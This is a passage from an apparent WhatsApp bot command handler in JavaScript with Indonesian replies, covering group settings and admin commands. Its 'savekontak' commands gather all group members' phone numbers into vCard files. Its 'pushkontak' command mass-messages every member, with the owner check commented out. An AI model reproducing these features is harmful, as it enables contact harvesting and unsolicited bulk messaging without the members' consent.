                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Antilink ON", "title": "Aktifkan Antilink Grup Lain", "id": ".antilink on" }, 
{ "header": "Antilink OFF", "title": "Matikan Antilink Grup Lain", "id": ".antilink off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(m.chat, msgii.message, {
            messageId: msgii.key.id
          })
        }
      }
        break
      case "antilinkV2": case "antilinkv2": {
        if (!isGroup) return SkyReply(msg.group)
        if (!isOwner && !isAdmin) return SkyReply(msg.admin)
        if (!text) {
          let teksnya = `
Pilih Salah Satu Option *AntilinkV2* Di Bawah Ini`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "AntilinkV2 ON", "title": "Aktifkan AntilinkV2 Grup Lain", "id": ".antilinkv2 on" }, 
{ "header": "AntilinkV2 OFF", "title": "Matikan AntilinkV2 Grup Lain", "id": ".antilinkV2 off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          return Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        }
        if (text == "on") {
          if (antilink2.includes(m.chat)) return SkyReply("AntilinkV2 Di Grup Ini Sudah Aktif")
          if (antilink.includes(m.chat)) {
            let posi = antilink.indexOf(m.chat)
            antilink.splice(posi, 1)
            await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
          }
          await antilink2.push(m.chat)
          await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
          let teksnya = `*AntilinkV2 Berhasil Diaktifkan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "AntilinkV2 ON", "title": "Aktifkan AntilinkV2 Grup Lain", "id": ".antilinkv2 on" }, 
{ "header": "AntilinkV2 OFF", "title": "Matikan AntilinkV2 Grup Lain", "id": ".antilinkV2 off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        } else if (text == "off") {
          if (!antilink2.includes(m.chat)) return SkyReply("Grup Ini Tidak Terdaftar Di Database AntilinkV2")
          let posi = antilink2.indexOf(m.chat)
          await antilink2.splice(posi, 1)
          await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
          let teksnya = `*AntilinkV2 Berhasil Dimatikan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "AntilinkV2 ON", "title": "Aktifkan AntilinkV2 Grup Lain", "id": ".antilinkv2 on" }, 
{ "header": "AntilinkV2 OFF", "title": "Matikan AntilinkV2 Grup Lain", "id": ".antilinkV2 off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(m.chat, msgii.message, {
            messageId: msgii.key.id
          })
        }
      }
        break
      case "autoread": {
        if (!isOwner) return SkyReply(msg.admin)
        if (!text) {
          let teksnya = `
Pilih Salah Satu Option *Autoread* Di Bawah Ini`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Bot Setting\",\"title\":\"Status Bot\",\"id\":\".statusbot\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Autoread ON", "title": "Aktifkan Autoread Message", "id": ".autoread on" }, 
{ "header": "Autoread OFF", "title": "Matikan Autoread Message", "id": ".autoread off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          return Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        }
        if (text == "on") {
          if (global.autoread) return SkyReply("Autoread Sudah Aktif")
          global.autoread = true
          let teksnya = `*Autoread Berhasil Diaktifkan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Bot*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Bot Setting\",\"title\":\"Status Bot\",\"id\":\".statusbot\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Autoread ON", "title": "Aktifkan Autoread Message", "id": ".autoread on" }, 
{ "header": "Autoread OFF", "title": "Matikan Autoread Message", "id": ".autoread off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        } else if (text == "off") {
          if (!global.autoread) return SkyReply("Autoread Sudah Tidak Aktif")
          global.autoread = false
          let teksnya = `*Autoread Berhasil Dimatikan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Bot*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Bot Setting\",\"title\":\"Status Bot\",\"id\":\".statusbot\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Autoread ON", "title": "Aktifkan Autoread Message", "id": ".autoread on" }, 
{ "header": "Autoread OFF", "title": "Matikan Autoread Message", "id": ".autoread off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(m.chat, msgii.message, {
            messageId: msgii.key.id
          })
        }
      }
        break
      case "autoreadsw": {
        if (!isOwner) return SkyReply(msg.admin)
        if (!text) {
          let teksnya = `
Pilih Salah Satu Option *Autoreadsw* Di Bawah Ini`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Bot Setting\",\"title\":\"Status Bot\",\"id\":\".statusbot\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Autoreadsw ON", "title": "Aktifkan Autoread Story", "id": ".autoreadsw on" }, 
{ "header": "Autoreadsw OFF", "title": "Matikan Autoread Story", "id": ".autoreadsw off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          return Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        }
        if (text == "on") {
          if (global.autoreadsw) return SkyReply("Autoreadsw Sudah Aktif")
          global.autoreadsw = true
          let teksnya = `*Autoreadsw Berhasil Diaktifkan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Bot*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Bot Setting\",\"title\":\"Status Bot\",\"id\":\".statusbot\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Autoreadsw ON", "title": "Aktifkan Autoread Story", "id": ".autoreadsw on" }, 
{ "header": "Autoreadsw OFF", "title": "Matikan Autoread Story", "id": ".autoreadsw off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        } else if (text == "off") {
          if (!global.autoreadsw) return SkyReply("Autoreadsw Sudah Tidak Aktif")
          global.autoreadsw = false
          let teksnya = `*Autoreadsw Berhasil Dimatikan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Bot*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Bot Setting\",\"title\":\"Status Bot\",\"id\":\".statusbot\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Autoreadsw ON", "title": "Aktifkan Autoread Story", "id": ".autoreadsw on" }, 
{ "header": "Autoreadsw OFF", "title": "Matikan Autoread Story", "id": ".autoreadsw off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(m.chat, msgii.message, {
            messageId: msgii.key.id
          })
        }
      }
        break
      case "anticall": {
        if (!isOwner) return SkyReply(msg.admin)
        if (!text) {
          let teksnya = `
Pilih Salah Satu Option *Anticall* Di Bawah Ini`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Bot Setting\",\"title\":\"Status Bot\",\"id\":\".statusbot\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Anticall ON", "title": "Aktifkan Call Auto Block", "id": ".anticall on" }, 
{ "header": "Anticall OFF", "title": "Matikan Call Auto Block", "id": ".anticall off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          return Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        }
        if (text == "on") {
          if (global.anticall) return SkyReply("Anticall Sudah Aktif")
          global.anticall = true
          let teksnya = `*Anticall Berhasil Diaktifkan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Bot*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Bot Setting\",\"title\":\"Status Bot\",\"id\":\".statusbot\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Anticall ON", "title": "Aktifkan Call Auto Block", "id": ".anticall on" }, 
{ "header": "Anticall OFF", "title": "Matikan Call Auto Block", "id": ".anticall off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        } else if (text == "off") {
          if (!global.anticall) return SkyReply("Anticall Sudah Tidak Aktif")
          global.anticall = false
          let teksnya = `*Anticall Berhasil Dimatikan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Bot*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Bot Setting\",\"title\":\"Status Bot\",\"id\":\".statusbot\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Anticall ON", "title": "Aktifkan Call Auto Block", "id": ".anticall on" }, 
{ "header": "Anticall OFF", "title": "Matikan Call Auto Block", "id": ".anticall off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(m.chat, msgii.message, {
            messageId: msgii.key.id
          })
        }
      }
        break
      case "setting": case "settingbot": case "option": case "statusbot": {
        if (!isOwner) return SkyReply(msg.owner)
        var teks = `
*List Status Setting Bot :*

* Autoread : ${global.autoread ? "*Aktif*" : "*Tidak Aktif*"}
* Autoreadsw : ${global.autoreadsw ? "*Aktif*" : "*Tidak Aktif*"}
* Anticall : ${global.anticall ? "*Aktif*" : "*Tidak Aktif*"}
* Welcome : ${global.welcome ? "*Aktif*" : "*Tidak Aktif*"}

*Contoh Penggunaan :*
Ketik *.autoread* on/off`
        SkyReply(teks)
      }
        break
      case "statusgc": {
        if (!isGroup) return SkyReply(msg.group)
        var teks = `
*List Status Setting Group 🏠*

* Antilink : *${antilink.includes(m.chat) ? "Aktif" : "Tidak Aktif"}*
* Antilink V2 : *${antilink2.includes(m.chat) ? "Aktif" : "Tidak Aktif"}*
* Welcome : *${welcome.includes(m.chat) ? "Aktif" : "Tidak Aktif"}*

*Contoh Cara Command :*
Ketik *${cmd}* on`
        Reza.sendText(m.chat, teks, qchanel)
      }
        break
      case "setppgc": {
        if (!isGroup) return SkyReply(msg.group)
        if (!isBotAdmin) return SkyReply(msg.adminbot)
        if (!isAdmin && !isOwner) return SkyReply(msg.admin)
        if (/image/g.test(mime)) {
          let media = await Reza.downloadAndSaveMediaMessage(qmsg)
          await Reza.updateProfilePicture(m.chat, { url: media })
          await fs.unlinkSync(media)
          SkyReply("*Berhasil Mengganti Foto Grup ✅*")
        } else return SkyReply(example('dengan mengirim foto'))
      }
        break
      case "setnamegc": case "setnamagc": {
        if (!isGroup) return SkyReply(msg.group)
        if (!isBotAdmin) return SkyReply(msg.adminbot)
        if (!isAdmin && !isOwner) return SkyReply(msg.admin)
        if (!text) return SkyReply(example('teksnya'))
        const gcname = metadata.subject
        await Reza.groupUpdateSubject(m.chat, text)
        SkyReply(`*Berhasil Mengganti Nama Grup ✅*\n*${gcname}* Menjadi *${text}*`)
      }
        break
      case "setdesc": case "setdesk": {
        if (!isGroup) return SkyReply(msg.group)
        if (!isBotAdmin) return SkyReply(msg.adminbot)
        if (!isAdmin && !isOwner) return SkyReply(msg.admin)
        if (!text) return SkyReply(example('teksnya'))
        await Reza.groupUpdateDescription(m.chat, text)
        SkyReply(`*Berhasil Mengganti Deskripsi Grup ✅*`)
      }
        break
      case "open": {
        if (!isGroup) return SkyReply(msg.group)
        if (!isBotAdmin) return SkyReply(msg.adminbot)
        if (!isAdmin && !isOwner) return SkyReply(msg.admin)
        await Reza.groupSettingUpdate(m.chat, 'not_announcement')
        SkyReply("*Berhasil Mengganti Setelan Grup ✅*\nMenjadi Anggota Dapat Mengirim Pesan")
      }
        break
      case "close": {
        if (!isGroup) return SkyReply(msg.group)
        if (!isBotAdmin) return SkyReply(msg.adminbot)
        if (!isAdmin && !isOwner) return SkyReply(msg.admin)
        await Reza.groupSettingUpdate(m.chat, 'announcement')
        SkyReply("*Berhasil Mengganti Setelan Grup ✅*\nMenjadi Hanya Admin Yang Dapat Mengirim Pesan")
      }
        break
      case "del": case "delete": {
        if (isGroup) {
          if (!isOwner && !isAdmin) return SkyReply(msg.admin)
          if (!m.quoted) return SkyReply("Reply Pesan Yang Ingin Di Hapus")
          if (m.quoted.sender == botNumber) {
            Reza.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
          } else {
            if (!isBotAdmin) return SkyReply(msg.adminbot)
            Reza.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
          }
        } else {
          if (!isOwner) return SkyReply(msg.owner)
          if (!m.quoted) return SkyReply("Reply Pesan Yang Ingin Di Hapus")
          Reza.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
        }
      }
        break
      case "demote": case "demote": {
        if (!isGroup) return SkyReply(msg.group)
        if (!isAdmin && !isOwner) return SkyReply(msg.admin)
        if (!isBotAdmin) return SkyReply(msg.adminbot)
        if (m.quoted || text) {
          let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          await Reza.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => SkyReply(`Berhasil Memberhentikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => SkyReply(err.toString()))
        } else return SkyReply(example('62838XXX'))
      }
        break
      case "promote": case "promot": {
        if (!isGroup) return SkyReply(msg.group)
        if (!isAdmin && !isOwner) return SkyReply(msg.admin)
        if (!isBotAdmin) return SkyReply(msg.adminbot)
        if (m.quoted || text) {
          let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          await Reza.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => SkyReply(`Berhasil Menjadikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => SkyReply(err.toString()))
        } else return SkyReply(example('6283XXX/@tag'))
      }
        break
      case "add": case "addmember": {
        if (!isGroup) return SkyReply(msg.group)
        if (!args[0]) return SkyReply(example("62838XXX"))
        var teks = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        var cek = await Reza.onWhatsApp(`${teks.split("@")[0]}`)
        if (cek.length < 1) return SkyReply("Nomor Tersebut Tidak Terdaftar Di WhatsApp")
        if (!isBotAdmin || !groupMetadata.memberAddMode) return SkyReply("Gagal Menambahkan Member, Karna Admin Tidak Mengizinkam Peserta Dapat Add Member")
        var a = await Reza.groupParticipantsUpdate(m.chat, [teks], 'add')
        if (a[0].status == 200) return SkyReply(`Berhasil Menambahkan ${teks.split("@")[0]} Kedalam Grup Ini`)
        if (a[0].status == 408) return SkyReply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
        if (a[0].status == 409) return SkyReply(`Dia Sudah Ada Di Dalam Grup Ini!`)
        if (a[0].status == 403) return SkyReply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
      }
        break
      case "kik": case "kick": {
        if (!isGroup) return SkyReply(msg.group)
        if (!isBotAdmin) return SkyReply(msg.adminbot)
        // if (!isAdmin && !isOwner) return SkyReply(msg.admin)
        if (text || m.quoted) {
          let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          await Reza.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => Reza.sendMessage(m.chat, { text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`] }, { quoted: m })).catch((err) => SkyReply(err.toString()))
        } else return SkyReply(example('nomornya/@tag'))
      }
        break
      case "hidetag": case "z": case "h": {
        if (!isGroup) return SkyReply(msg.group)
        // if (!isAdmin && !isOwner) return SkyReply(msg.admin)
        if (!m.quoted && !text) return SkyReply(example("teksnya/replyteks"))
        var teks = m.quoted ? m.quoted.text : text
        var member = await groupMetadata.participants.map(e => e.id)
        Reza.sendMessage(m.chat, { text: teks, mentions: [...member] })
      }
        break
      case "tagall": case "tag": {
        if (!isGroup) return SkyReply(msg.group)
        // if (!isAdmin && !isOwner) return SkyReply(msg.admin)
        if (!text) return SkyReply(example("Pesannya"))
        var member = await groupMetadata.participants.map(e => e.id)
        var teks = `${text}\n\n`
        member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
        Reza.sendMessage(m.chat, { text: teks, mentions: [...member] })
      }
        break
      case "savekontak": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!isGroup) return SkyReply(msg.group)
        const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
        for (let mem of halls) {
          if (mem !== m.sender) {
            contacts.push(mem)
            fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
          }
        }
        try {
          const uniqueContacts = [...new Set(contacts)]
          const vcardContent = uniqueContacts.map((contact, index) => {
            const vcard = [
              "BEGIN:VCARD",
              "VERSION:3.0",
              `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
              `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
              "END:VCARD",
              "",].join("\n")
            return vcard
          }).join("")
          fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
        } catch (err) {
          SkyReply(err.toString())
        } finally {
          if (m.chat !== m.sender) await SkyReply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
          await Reza.sendMessage(m.sender, {
            document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Contact Berhasil Di Buat ✅\n*
*Total ${halls.length} Kontak*`, mimetype: "text/vcard",
          }, { quoted: m })
          contacts.splice(0, contacts.length)
          await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
          await fs.writeFileSync("./all/database/contacts.vcf", "")
        }
      }
        break
      case "savekontak2": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
        var idnya = text
        var groupMetadataa
        try {
          groupMetadataa = await Reza.groupMetadata(`${idnya}`)
        } catch (e) {
          return SkyReply("*ID Grup* tidak valid!")
        }
        const participants = await groupMetadataa.participants
        const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
        for (let mem of halls) {
          if (mem !== m.sender) {
            contacts.push(mem)
            fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
          }
        }
        try {
          const uniqueContacts = [...new Set(contacts)]
          const vcardContent = uniqueContacts.map((contact, index) => {
            const vcard = [
              "BEGIN:VCARD",
              "VERSION:3.0",
              `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
              `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
              "END:VCARD",
              "",].join("\n")
            return vcard
          }).join("")
          fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
        } catch (err) {
          SkyReply(err.toString())
        } finally {
          if (m.chat !== m.sender) await SkyReply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
          await Reza.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
          contacts.splice(0, contacts.length)
          await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
          await fs.writeFileSync("./all/database/contacts.vcf", "")
        }
      }
        break
      case "pushkontak": {
        // if (!isOwner) return SkyReply(msg.owner)
        if (!isGroup) return SkyReply(msg.group)
        if (!text) return SkyReply(example("pesannya"))
        var teks = text
        const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
        let time = ms(delaypushkontak * Number(halls.length))
        await SkyReply(`Proses Mengirim Pesan Ke *${halls.length} Member Grup*

*Waktu Selesai :*
${time.minutes} menit, ${time.seconds} detik`)
        for (let mem of halls) {
          if (mem !== m.sender) {
            contacts.push(mem)
            await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
            await Reza.sendMessage(mem, { text: teks }, { quoted: qchanel })
            await sleep(global.delaypushkontak)
          }
        }
        try {
          const uniqueContacts = [...new Set(contacts)]
          const vcardContent = uniqueContacts.map((contact, index) => {
            const vcard = [
              "BEGIN:VCARD",
              "VERSION:3.0",
              `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
              `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
              "END:VCARD",
              "",].join("\n")
            return vcard
          }).join("")
          fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
        } catch (err) {
          SkyReply(err.toString())
        } finally {
          if (m.chat !== m.sender) await SkyReply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
